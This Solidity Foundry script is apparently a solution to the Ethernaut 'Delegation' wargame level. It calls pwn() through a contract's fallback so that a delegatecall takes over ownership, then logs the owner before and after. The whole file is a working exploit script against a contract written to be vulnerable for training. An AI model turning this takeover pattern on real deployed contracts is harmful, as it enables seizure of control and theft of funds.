// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegate, Delegation} from "../src/Delegation.sol";
import {Script, console} from "forge-std/Script.sol";

contract DelegationSolution is Script {
    Delegation public delegation = Delegation(0xA5410EF56e8371A860B16519dBf2EFeBaeEfa24b);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("The owner of the contract before exploit: ", delegation.owner());
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("The Bool of transcation: ", success);
        console.log("The owner of the contract after exploit: ", delegation.owner());
        console.log("The attacker address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
